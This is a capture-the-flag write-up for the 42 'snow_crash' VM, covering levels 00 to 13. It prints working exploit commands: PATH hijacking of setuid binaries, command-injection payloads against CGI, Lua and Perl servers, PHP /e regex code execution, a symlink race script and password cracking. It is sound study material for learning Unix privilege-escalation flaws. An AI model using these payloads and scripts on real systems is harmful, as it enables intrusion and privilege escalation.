# snow\_crash

This is a CTF made in 42. The flags, you gotta catch them all. At each level
there is a way to hack yourself to the next level by finding the flag which is
the password for the next user.

## Setup

```shell
# launch the snow_crash vm with qemu
./vm_lauch.bash
# connect to it with ssh (pass: level00)
ssh -p 2222 level00@localhost
```

> The vm\_launch.bash script takes an optional parameter for the ISO path.

## Caesar Cipher (level00)

The password for the user flag00 is located in the file `/usr/sbin/john`. It is
a plaintext file containing a string encrypted with a
[caesar cipher](https://en.wikipedia.org/wiki/Caesar_cipher). This is a classic
and simple symetric encryption scheme which uses a key for rotating the
characters in a text. Here the key is -11. This is means that each letter in the
text has been shifted on the left eleven times. To decrypt the password we need
to do the inverse operation, which is a right shift of the same value.

| Cipher | c | d | i | i | d | d | w | p | g | s | w | t | g | t |
|:------:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| Plain  | n | o | t | t | o | o | h | a | r | d | h | e | r | e |

## Broken DES (level01)

The second level is as simple as running john the ripper on flag01's password
hash, as it is subtly hinted at by the first level's password filename.

```shell
# copy the passwd file from the virtual machine (with level00 as a password)
scp -P 2222 level00@localhost:/etc/passwd .
# pass it through john the ripper
john --show passwd
```

This should output something like that:

```
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash

1 password hash cracked, 0 left
```

Where `abcdefg` is the password for flag01. It works because here the legacy
unix password hashing function `crypt` is used for encrypting the user's
password. It is based on a modified version of
[DES](https://en.wikipedia.org/wiki/Data_Encryption_Standard) to turn it into a
one-way function but it is not secure anymore, especially when the password is
as simple as it is here.

## Wireshark packet dump (level02)

Here you have a .pcap file at the root of the home directory. This contains a
list of TCP packets captured with wireshark. The password is contained in the
payloads of the TCP packets after the `Password:` string (which is really a
prompt). Each TCP payload is one byte long and represents an input from the user
logging into this insecure online service. The input ends with a 0x0d, which is
a form feed character meaning that the input is done.

To read the file simply copy it from the virtual machine and open it with
wireshark.

```shell
# copy the file from the vm (with the flag from the last level)
scp -P 2222 level02@localhost:~/level02.pcap .
# change its permissions to open it
chmod 644 level02.pcap
# read it with wireshark
wireshark level02.pcap
```

> If you dont have wireshark or cannot install it (like on 42's machines), just
> use the tshark.bash script in level02's Resources directory. It will read it
> and print each TCP payload from the pcap file: `./tshark.bash`.

Note that some of the payloads of the password are 0x7f. This is the DEL
character, which means the user screwed up and deleted part of his input. So _n_
preceding characters need to be deleted, where _n_ is the number of DEL in a
row. The final password is: `ft_waNDReL0L`.

## Use the PATH luke (level03)

Here we have binary owned by the flag03 user and the setuid bit on. The level03
user has execution rights on it, which means that whatever it does will be done
as if it was the user flag03 that executed it.

By running the binary through gdb and breaking in main, we can see that it calls
the `system` function to execute an echo command.

```shell
# run gdb on the binary
gdb ./level03
# set a breakpoint at the main function (through gdb's prompt)
(gdb) b main
# run the program
(gdb) run
# see the assembly code being executed
(gdb) disass
```

At the end of the assembly instruction list, we can see these two lines:

```
   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   0x080484fe <+90>:    call   0x80483b0 <system@plt>
```

The first instruction loads a parameter into esp for the system function call
on the next line. When printing the string being passed to it (as it is what
[system](https://man7.org/linux/man-pages/man3/system.3.html) takes as a
parameter), we can see which command will be executed:

```
# print the parameter
(gdb) p (char *)0x80485e0
# outputs
$1 = 0x80485e0 "/usr/bin/env echo Exploit me"
```

Since the echo binary is explicitely located through the env command and not
hardcoded with an absolute path, we can use the `PATH` environment variable of
the shell to execute arbitrary code:

```shell
# write the script that will be executed by the system call
cat << END > /tmp/echo
#!/bin/bash

/usr/bin/id
/bin/getflag
END
# make it executable
chmod +x /tmp/echo
# run the binary and make the shell look into /tmp for the echo command
PATH=/tmp ./level03
```

Which will output:

```
uid=3003(flag03) gid=2003(level03) groups=3003(flag03),100(users),2003(level03)
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## CGI bad (level04)

The perl script at the root the home is a CGI file. It is used to render web
pages dynamically. The corresponding page, as it is nicely pointed out by the
comment in the script, is served on localhost:4747.

There is nothing to be showed right now. But like in the last exercise, the perl
script has the setuid bit on and belongs to flag04. In it we can see a backtick
syntax with an echo command and what looks like variable substitution with '$y'.

Just give 'x=something' as a get parameter to the page to see 'something' in it
through the echo command. Since it's a shell command just pass ';getflag' to it:

```shell
# get the page and the flag ('%3b' is the URL-friendly version of ';')
curl localhost:4747?x=%3bgetflag
```

## Be careful what you script for (level05)

The level05 home is empty. If we look inside /usr/sbin/ we can see that there
is a script named 'openarenaserver' that belongs to flag05. It executes every
bash script in the '/opt/openarenaserver' directory, on which level05 has full
access. The script typically looks like it is executed with a cronjob, so all we
have to do is write a script that will call the `getflag` command and save the
output to a file:

```shell
# write this script in the directory
cat << END > /opt/openarenaserver/script
getflag > /tmp/flag
END
# wait for the flag file to appear (or just spam `cat /tmp/flag` like a retard)
while [ ! -f /tmp/flag ]; do sleep 1; done; cat /tmp/flag
```

## Breaking out of PHP regex hell (level06)

The level06 is a setuid binary that takes two arguments and passes them to an
overly convoluted php script that it executes (see the decompiled
[source code](level06/Resources/source.c)). The script contains a regex with the
'\e' option, which means it evaluates the code inside it as php code and
executes it. So this is our obvious way in. The less obvious thing is to find
what the arguments are to exploit the script.

The first argument must be a file since the `file_get_contents` function is
called on it. The second one is a string of php code that will be executed if
the contents of the file do match the '\e' regex.

```shell
# set the file to match the regex
cat << END > /tmp/hell_regex_match
[x {${eval($z)}}]
END
# call the binary with the file and the code to execute
./level06 /tmp/hell_regex_match 'shell_exec("getflag > /tmp/flag");'
# get the flag
cat /tmp/flag
```

Although, there is a way simpler solution. By default, when logging in with a
user, the home does not have write permissions on. However, since the user
obviously owns its home directory he can change that. This means we can delete
the orginal file and replace it with our own:

```shell
# change directory permissions
chmod 755 .
# delete annoying php script
rm level06.php
# replace it by what we want to execute
cat << END > level06.php
<?php
shell_exec("getflag > /tmp/flag");
?>
END
# run the script through the binary
./level06
# get the flag
cat /tmp/flag
```

## Carefully examine your surroundings (level07)

As usual, we have a setuid binary in the home (see the decompiled
[source code](level07/Resources/source.c)). This one calls the system function
by directly passing it the contents of the `LOGNAME` env variable through an
asprintf call with the following format: `/bin/echo %s`. This means we just have
to do that to get the flag:

```shell
# end the echo command, add a ';' separator and call getflag
env LOGNAME='lol im gonna pown you ez; getflag' ./level07
```

## Hardcode is soft code (level08)

This time we have two files in the home. The usual setuid binary and an
unreadable token file (see the decompiled
[source code](level08/Resources/source.c)). The binary takes a filename as input
and reads it if we can access it. So `./level08 token` won't work. However, the
only "access check" it does is to compare the argument with a hardcoded "token"
string. This means that we just have to create a symlink to the token file with
a different name and read this file instead.

```shell
# create a symlink pointing to our token file
ln -s -T /home/user/level08/token /tmp/link
# read it with the level08 binary
./level08 /tmp/link
# then use the token to log as flag08
su flag08
# get the flag
getflag
```

## The ultimate cipher (level09)

The home looks like the preceding level except that the token file is readable.
Here the binary is executing a "cipher" on a string it is given as an argument.
The cipher is pretty simple. It takes every character of the string and
increments it by its index.

The trick here is that the token file is the result of this operation. Which
means we have to reverse the process to get the token. So all we have to do is
to copy this file to the vm, compile it and run the token file through it.

```C
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
	if (argc < 2)
	{
		fprintf(stderr, "%s: missing argument\n", argv[0]);
		return (EXIT_FAILURE);
	}

	char *arg = argv[1];
	for (int i = 0; arg[i]; ++i)
		putchar(arg[i] - i);
	putchar('\n');
	return (EXIT_SUCCESS);
}
```

So this should get us there:

```shell
# change permissions for convenience (in the vm)
chmod 755 .
# copy the reverse file to the vm (on the host)
scp -P 2222 level09/reverse.c level09@localhost:~/
# compile it (on the vm)
gcc -std=c99 reverse.c
# execute it on the file contents
./a.out "$(cat token)"
# log as flag09 with the token
su flag09
# get the flag
getflag
```

## Data has a need for speed (level10)

This one contains the usual setuid binary (decompiled
[source code](level10/Resources/source.c)) and an unreadable token. The binary
takes two arguments, the file and a host. We can see from the source that there
is an access check to see if the user is authorized to read the file. If the
test passes, the program goes on to establish a connection to the provided host,
reads the file contents and sends it to the given host on port 6969. Since the
level10 user does not have access to the file, we need to find a way to
circumvent the access check.

The way to do is this is to create a symlink to a file on which level10 user has
access. Then during the time it takes to establish the connection we can remove
the symlink and create a new one pointing to the token file. This is possible
because open will work on the token file since the program has the setuid bit
on.

Since this level uses a socket connection we will use
[nc](https://www.unix.com/man-page/Linux/1/netcat/) to read the file. We can do
this locally on the vm. We just need to use `0.0.0.0` as a host and to setup a
second ssh connection to the vm to wait for the response:

```shell
# connect to the vm in an other window
ssh -p 2222 level10@localhost
# setup netcat to listen on port 6969
nc -l 6969
```

This is the program were going to use for switching the symlink target:

```C
#include <stdio.h>
#include <stdlib.h>

char	*slink = "/tmp/link";
char	*file = "/home/user/level10/token";

int main(void)
{
	remove(slink);
	symlink(file, slink);
	return (0);
}
```

And the exploit script that will do all the work for us:

```shell
# compile the switch_link program
cd /tmp && gcc switch_link.c
# create a dummy file to link to
echo 'dummy' > /tmp/dummy

while true; do
	# delete the link file if it exists
	rm -rf /tmp/link
	# recreate a link that will pass the access test
	ln -s -T /tmp/dummy /tmp/link
	# execute the data race command
	/tmp/a.out | ~/level10 /tmp/link 0.0.0.0 1>&2
	# wait for the data to be written
	sleep 1
done
```

You just have to execute these commands to pass to the next level:

```shell
# set permissions for convenience (on the vm)
chmod 755 .
# copy the switch_link file to the vm (on the host)
scp -P 2222 level10/switch_link.c level10@localhost:/tmp
# copy the exploit script to the vm (on the host too)
scp -P 2222 level10/exploit.bash level10@localhost:~
# execute the exploit (back on the vm)
./exploit.bash
# stop the script when the token appears and log as flag10
su flag10
# get the flag
getflag
```

## A good input is like a good keyboard, it should be sanitized (level11)

This one contains a lua server waiting for a password. It reads user input on
the port 5151 and directly gives it to an io.popen() call to get its hash. Since
io.popen() takes a shell command as input and that the server has the setuid bit
on, we can simply pass it a command to get the flag.

```shell
# connect to the local server
nc localhost 5151
# give this as an input to get the flag
Im in; getflag > /tmp/flag; chmod 644 /tmp/flag; echo lol
```

## Still the same perl (level12)

Here we have a script that defines a server lisntening on 4646. Its setuid is
set to this level's flag user as usual. The perl script takes two arguments
which can be passed via url when fetching the page on localhost:4646.

The script takes user input, does some kind of sanitation on it (but bad). It
turns every lowercase character to uppercase and removes everything after the
first whitespace occurence. Also the characters are put in between quotes to
make sure it is only interpreted as a string. The command executed is supposed
to look for a line that matches the string given by argument in the file
/tmp/xd. However, since the file does not exist what we can do is simply create
it to be an executable script, add a separator in the string we pass and close
the quotes to run it.

So we will set _$xx_ to be equal to `lol";ptdr="lol` in this command
`egrep "^$xx" /tmp/xd 2>&1` so that it is evaluated as:
`egrep "^LOL";PTDR="LOL" /tmp/xd 2>&1`.

> Some special characters need to be specified as escape sequences to be passed
> into url parameters. Here the _"_ is _%22_, the _;_ is _%3b_ and the _=_ is
> _%3d_.

```shell
# create the script to run
cat << END > /tmp/xd
#!/bin/bash

getflag > /tmp/flag
END
# make it executable
chmod +x /tmp/xd
# give the magic string that will pass sanitation
curl localhost:4646?x=lol%22%3bptdr%3d%22lol
# and there you go
cat /tmp/flag
```

## Great answer times 101 (level13)

This level contains our usual setuid binary (decompiled
[source code](level13/Resources/source.c)). Running it without arguments will
give this output:

```
UID 2013 started us but we we expect 4242
```

This means that our flag a is simple getuid call away from us. All we have to do
is run the binary through gdb break at the line after the getuid call, set the
_eax_ register to 4242 and continue.
